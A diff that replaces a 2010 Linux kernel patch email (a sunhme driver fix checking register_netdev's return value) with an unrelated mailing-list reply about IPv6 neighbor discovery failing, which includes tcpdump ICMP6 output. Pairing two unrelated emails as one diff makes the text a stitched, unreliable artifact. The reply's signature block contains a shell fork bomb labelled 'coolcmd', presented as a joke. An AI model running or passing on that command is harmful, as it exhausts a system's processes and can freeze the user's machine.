@@ -1,49 +1,39 @@
-From: Tobias Klauser <tklauser@distanz.ch>
-Subject: [PATCH] sunhme: Use return value of register_netdev
-Date: Tue, 17 Aug 2010 18:13:05 +0200
-Message-ID: <1282061585-19527-1-git-send-email-tklauser@distanz.ch>
-Cc: kernel-janitors@vger.kernel.org
-To: "David S. Miller" <davem@davemloft.net>, netdev@vger.kernel.org
-Return-path: <netdev-owner@vger.kernel.org>
-Received: from mx1.zhaw.ch ([160.85.104.50]:34260 "EHLO mx1.zhaw.ch"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1757274Ab0HQQNH (ORCPT <rfc822;netdev@vger.kernel.org>);
-	Tue, 17 Aug 2010 12:13:07 -0400
-Sender: netdev-owner@vger.kernel.org
-List-ID: <netdev.vger.kernel.org>
+From: Thomas Habets <thomas@habets.pp.se>
+Subject: Re: BUG: IPv6 stops working after a while, needs ip ne del command
+ to reset
+Date: Tue, 17 Aug 2010 18:14:01 +0200 (CEST)
+Message-ID: <alpine.DEB.1.10.1008171811590.21857@red.crap.retrofitta.se>
+References: <alpine.DEB.1.10.1008131952470.19570@red.crap.retrofitta.se>  <1281953960.2524.23.camel@edumazet-laptop>  <alpine.DEB.1.10.1008161224510.13728@red.crap.retrofitta.se>  <alpine.DEB.1.10.1008170719180.21857@red.crap.retrofitta.se>
+ <1282024802.2487.687.camel@edumazet-laptop>  <alpine.DEB.1.10.1008171053230.21857@red.crap.retrofitta.se> <1282050920.2448.47.camel@edumazet-laptop> <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
+Mime-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
+Cc: Eric Dumazet <eric.dumazet@gmail.com>,
+	linux-kernel@vger.kernel.org, netdev <netdev@vger.kernel.org>
+To: Thomas Habets <thomas@habets.pp.se>
+Return-path: <linux-kernel-owner@vger.kernel.org>
+In-Reply-To: <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
+Sender: linux-kernel-owner@vger.kernel.org
+List-Id: netdev.vger.kernel.org
 
-Use the return value provided by register_netdev on error instead of
-using a previously set value.
+On Tue, 17 Aug 2010, Thomas Habets wrote:
+> [ here i run "ip l set promisc on eth0" ]
+[...]
+> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
+> 2a00:800:752:1::5c:1 > 2a00:800:752:1::5c:2: ICMP6, echo reply
 
-Signed-off-by: Tobias Klauser <tklauser@distanz.ch>
----
- drivers/net/sunhme.c |    6 ++++--
- 1 files changed, 4 insertions(+), 2 deletions(-)
+I should add that I turned promisc mode back off at about here. Otherwise 
+the ND would work properly right after the "clear ipv6 neigbors" command.
 
-diff --git a/drivers/net/sunhme.c b/drivers/net/sunhme.c
-index bd0df1c..d96431e 100644
---- a/drivers/net/sunhme.c
-+++ b/drivers/net/sunhme.c
-@@ -2808,7 +2808,8 @@ static int __devinit happy_meal_sbus_probe_one(struct platform_device *op, int i
- 	happy_meal_set_initial_advertisement(hp);
- 	spin_unlock_irq(&hp->happy_lock);
- 
--	if (register_netdev(hp->dev)) {
-+	err = register_netdev(hp->dev);
-+	if (err) {
- 		printk(KERN_ERR "happymeal: Cannot register net device, "
- 		       "aborting.\n");
- 		goto err_out_free_coherent;
-@@ -3130,7 +3131,8 @@ static int __devinit happy_meal_pci_probe(struct pci_dev *pdev,
- 	happy_meal_set_initial_advertisement(hp);
- 	spin_unlock_irq(&hp->happy_lock);
- 
--	if (register_netdev(hp->dev)) {
-+	err = register_netdev(hp->dev);
-+	if (err) {
- 		printk(KERN_ERR "happymeal(PCI): Cannot register net device, "
- 		       "aborting.\n");
- 		goto err_out_iounmap;
--- 
-1.7.0.4
+> [ here I run "clear ipv6 neigbors" again ]
+> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
+> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
 
+---------
+typedef struct me_s {
+   char name[]      = { "Thomas Habets" };
+   char email[]     = { "thomas@habets.pp.se" };
+   char kernel[]    = { "Linux" };
+   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
+   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
+   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
+} me_t;
